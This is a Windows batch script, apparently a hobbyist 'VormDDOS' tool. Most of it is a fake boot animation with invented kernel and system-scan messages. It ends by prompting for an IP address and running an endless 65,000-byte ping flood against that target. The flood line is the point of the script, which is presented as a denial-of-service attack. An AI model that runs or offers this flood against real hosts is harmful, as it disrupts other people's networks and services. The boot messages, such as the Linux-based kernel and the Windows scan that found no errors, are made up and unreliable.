@echo off
color 4
title Booting...
cls

echo -------------------------------------------
echo Wilkommen! VormOS Kernel wird Geladen!
echo -------------------------------------------
ping 127.0.0.1 -n 3 >nul
cls

title VormOS Kernel Info
echo ---------------------------------------------------------
echo VormOS Kernel v0.12.3345
echo This System is introduced by Linux and is in Open Source!
echo ---------------------------------------------------------
ping 127.0.0.1 -n 4 >nul
cls

title VormOS Kernel
echo Starting VormOS Kernel [0.12.3345]
ping 127.0.0.1 -n 1,5 >nul
title Loadet Kernel
echo VormOS Kernel Loaded Successfully [0.12.3345]
ping 127.0.0.1 -n 1,5 >nul
title Booting [VormDDOS v1.0]
echo Booting BatchFile VormDDOS [1.0]
ping 127.0.0.1 -n 1 >nul
title VormDDOS is Loaded! [1.0]
echo BatchFile VormDDOS Loaded Successfully [1.0]
ping 127.0.0.1 -n 1 >nul
title Loading Needed Configurations 
echo Loading Network Adapter for VormDDOS [127.0.0.1]
ping 127.0.0.1 -n 1 >nul
title Configurations loaded!
echo All Configurations loaded successfully: Network Adapter [127.0.0.1]
ping 127.0.0.1 -n 1 >nul
title Windows is Scanning VormOS [12.11]
echo CMD Windows Terminal is scanning VormOS [12.11]
ping 127.0.0.1 -n 1 >nul
title Scan Complete!
echo Windows Scanned VormOS [12.11], no errors found!
ping 127.0.0.1 -n 1 >nul
title Loading BatchSystem [Win10]
echo Booting up BatchSystem [Win10]
ping 127.0.0.1 -n 1 >nul
cls

title BatchSystem wird Geladen....
echo -------------------------------------
echo Vormrodo BatchSystem wird Geladen....
echo -------------------------------------
ping 127.0.0.1 -n 3 >nul
cls


title Wird Geladen... [-----------]
echo Vormrodo BatchSystem wird geladen....
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û                                    Û 0%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping 127.0.0.1 -n 2 >nul
cls

title Wird Geladen... [000--------]
echo Vormrodo BatchSystem wird geladen....
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°°°°°°                        Û 25%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping 127.0.0.1 -n 3 >nul
cls

title Wird Geladen... [0000-------]
echo Vormrodo BatchSystem wird geladen....
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°°°°°°°°°°                Û 56%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping 127.0.0.1 -n 2,5 >nul
cls

title Wird Geladen... [0000000000-]
echo Vormrodo BatchSystem wird geladen....
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°°°°°°°°°°°°°°°°°  Û 95%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping 127.0.0.1 -n 2 >nul
cls

title Wird Geladen... [00000000000]
echo Vormrodo BatchSystem wird geladen....
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°°°°°°°°°°°°°°°°°°Û 100%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping 127.0.0.1 -n 2 >nul
cls

title BatchSystem Geladen!
echo ---------------------------------------
echo Vormrodo BatchSystem ist Einsatzbereit!
echo VormDDOS Wird Gestartet
echo ---------------------------------------
ping 127.0.0.1 -n 3 >nul
cls

ECHO ##::::'##::'#######::'########::'##::::'##:'########::'########:::'#######:::'######::
ECHO ##:::: ##:'##.... ##: ##.... ##: ###::'###: ##.... ##: ##.... ##:'##.... ##:'##... ##:
ECHO ##:::: ##: ##:::: ##: ##:::: ##: ####'####: ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::
ECHO ##:::: ##: ##:::: ##: ########:: ## ### ##: ##:::: ##: ##:::: ##: ##:::: ##:. ######::
ECHO. ##:: ##:: ##:::: ##: ##.. ##::: ##. #: ##: ##:::: ##: ##:::: ##: ##:::: ##::..... ##:
ECHO:. ## ##::: ##:::: ##: ##::. ##:: ##:.:: ##: ##:::: ##: ##:::: ##: ##:::: ##:'##::: ##:
ECHO::. ###::::. #######:: ##:::. ##: ##:::: ##: ########:: ########::. #######::. ######::
ECHO:::...::::::.......:::..:::::..::..:::::..::........:::........::::.......::::......:::

title VormDDOS
set /p IP=IP Eingeben:
:top
ping -l 65000 -t %IP%